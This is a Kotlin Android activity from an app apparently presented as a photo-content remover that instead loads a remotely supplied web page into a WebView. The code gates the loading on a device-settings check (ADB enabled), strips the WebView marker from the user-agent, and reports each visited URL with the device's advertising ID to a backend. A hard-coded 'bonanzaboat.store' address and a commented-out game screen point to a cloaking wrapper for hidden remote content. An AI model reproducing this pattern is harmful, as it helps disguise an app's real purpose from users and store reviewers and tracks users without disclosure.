package vn.remove.photo.conten

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Message
import android.preference.PreferenceManager
import android.provider.Settings
import android.util.Log
import android.view.View
import android.webkit.*
import android.widget.Toast
import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.ViewModelProvider
import androidx.lifecycle.lifecycleScope
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import vn.remove.photo.conten.databinding.ActivityMainBinding

class MainActivity : AppCompatActivity() {
    private val boatView by lazy {
        ViewModelProvider(this)[BoatViewModel::class.java]
    }
    private val main by lazy {
        ActivityMainBinding.inflate(layoutInflater)
    }
    lateinit var sharedPreferences: SharedPreferences
    var messageAb: ValueCallback<Array<Uri?>>? = null
    private val resultCode = 1

    private val imageTitle = "Image Chooser"
    private val image = "image/*"

    var callback: ValueCallback<Uri>? = null

    var data: String? = null
    lateinit var editor: SharedPreferences.Editor

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(main.root)
        val prefs = PreferenceManager.getDefaultSharedPreferences(this)
        getId().observe(this) {
            boatView.firedataLive(application, it).observe(this) { live ->
                if (checkAdb(application)) {
                    data = live
                    webWork(savedInstanceState, it)
                } else {
//                    go()
                }
            }
            if (!prefs.getBoolean("end", false)) {
                boatView.buildingLinkGetter(this, it)
                val editor = prefs.edit()
                editor.putBoolean("end", true)
                editor.apply()
            }
        }
    }
    private fun webWork(savedInstanceState: Bundle?, id: String) {

        sharedPreferences = getSharedPreferences(NAME_SHARED, Context.MODE_PRIVATE)
        editor = sharedPreferences.edit()

        CookieManager.getInstance().setAcceptCookie(true)
        CookieManager.getInstance().setAcceptThirdPartyCookies(main.webView, true)

        with(main.webView) {
            with(settings) {
                domStorageEnabled = true
                loadWithOverviewMode = false
                userAgentString = WebView(application)
                    .settings.userAgentString
                    .replace("wv", "")
            }

            loadUrl(data.toString())
            webViewClient = LocalClient(id)
            settings.javaScriptEnabled = true
        }
        chromeClient(savedInstanceState)
    }

    private fun chromeClient(savedInstanceState: Bundle?) {
        main.webView.webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, newProgress: Int) {
                super.onProgressChanged(view, newProgress)
            }

            //For Android API >= 21 (5.0 OS)
            override fun onShowFileChooser(
                webView: WebView?,
                filePathCallback: ValueCallback<Array<Uri?>>?,
                fileChooserParams: FileChooserParams?
            ): Boolean {
                messageAb = filePathCallback
                selectImageIfNeed()
                return true
            }

            override fun onCreateWindow(
                view: WebView?, isDialog: Boolean,
                isUserGesture: Boolean, resultMsg: Message
            ): Boolean {
                val newWebView = WebView(applicationContext)
                with(newWebView.settings) {
                    javaScriptEnabled = true
                    javaScriptCanOpenWindowsAutomatically = true
                    domStorageEnabled = true
                    setSupportMultipleWindows(true)
                }
                newWebView.webChromeClient = this

                val transport = resultMsg.obj as WebView.WebViewTransport
                transport.webView = newWebView
                resultMsg.sendToTarget()

                newWebView.webViewClient = object : WebViewClient() {
                    override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                        if (savedInstanceState == null) {
                            main.webView.loadUrl(url)
                        }
                        return true
                    }
                }
                return true
            }
        }
    }

    private fun selectImageIfNeed() {
        val i = Intent(Intent.ACTION_GET_CONTENT)
        i.addCategory(Intent.CATEGORY_OPENABLE)
        i.type = image
        startActivityForResult(
            Intent.createChooser(i, imageTitle),
            resultCode
        )
    }

    private inner class LocalClient(
        val id: String
    ) : WebViewClient() {

        override fun onReceivedError(
            view: WebView?,
            errorCode: Int,
            description: String?,
            failingUrl: String?
        ) {
            super.onReceivedError(view, errorCode, description, failingUrl)
            if (errorCode == -2) {
                Toast.makeText(application, ERROR_TX, Toast.LENGTH_LONG).show()
            }
        }

        override fun shouldOverrideUrlLoading(
            view: WebView?,
            request: WebResourceRequest?
        ): Boolean {
            return super.shouldOverrideUrlLoading(view, request)
        }

        override fun onPageFinished(view: WebView?, url: String?) {
            super.onPageFinished(view, url)
            if (url.equals(BASE_URL)) {
//                startActivity(Intent(this@MainActivity, CleopatraActivity::class.java))
//                finish()
            } else {
                main.loadingView.visibility = View.GONE
                main.webView.visibility = View.VISIBLE
                CookieManager.getInstance().flush()
                when (sharedPreferences.getString(CHECK, "")) {
                    CHECKED -> {
                        boatView.setBoat(linkUrl = url.toString(), gog = id, app = application)
                        Log.d("olympusViewModel_save_1", url.toString())

                        editor.putString(CHECK, "false")
                        editor.commit()
                    }
                    "" -> {
                        boatView.setBoat(linkUrl = url.toString(), gog = id, app = application)
                        Log.d("olympusViewModel_save_2", url.toString())
                        editor.putString(CHECK, CHECKED)
                        editor.commit()
                    }
                    "false" -> {
                        editor.putString(CHECK, "false")
                        editor.commit()
                    }

                    null -> {
                        editor.putString(CHECK, CHECKED)
                        editor.commit()
                    }
                }
            }
        }
    }

    override fun onActivityResult(
        requestCode: Int,
        resultCode: Int,
        data: Intent?
    ) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == this.resultCode) {
            if (null == callback && null == messageAb) return
            val result =
                if (data == null || resultCode != RESULT_OK) null else data.data
            if (messageAb != null) {
                checkGame(requestCode, resultCode, data, messageAb)
            } else if (callback != null) {
                callback!!.onReceiveValue(result)
                callback = null
            }
        }
    }

    private fun checkGame(
        requestCode: Int,
        resultCode: Int,
        intent: Intent?,
        messageAb: ValueCallback<Array<Uri?>>?
    ) {
        if (requestCode != this.resultCode || messageAb == null) return
        var results: Array<Uri?>? = null
        if (resultCode == Activity.RESULT_OK) {
            if (intent != null) {
                val dataString = intent.dataString
                val clipData = intent.clipData
                if (clipData != null) {
                    results = arrayOfNulls(clipData.itemCount)
                    for (i in 0 until clipData.itemCount) {
                        val item = clipData.getItemAt(i)
                        results[i] = item.uri
                    }
                }
                if (dataString != null) results =
                    arrayOf(Uri.parse(dataString))
            }
        }
        messageAb.onReceiveValue(results)
    }

    override fun onBackPressed() {
        if (main.webView.canGoBack()) {
            main.webView.goBack()
        }
    }


    fun getId(): LiveData<String> {
        val i: MutableLiveData<String> = MutableLiveData()
        lifecycleScope.launch {
            i.value = withContext(Dispatchers.Default) {
                AdvertisingIdClient.getAdvertisingIdInfo(
                    application
                ).id.toString()
            }
        }
        return i
    }


    private fun checkAdb(context: Context): Boolean {
        return Settings.Global.getString(
            context.contentResolver,
            Settings.Global.ADB_ENABLED
        ) == "1"
    }
    companion object {
        private const val CHECK = "check"
        private const val CHECKED = "checked"
        private const val BASE_URL = "https://bonanzaboat.store/"
        private const val ERROR_TX = "Error"
        private const val NAME_SHARED = "prefses"
    }
}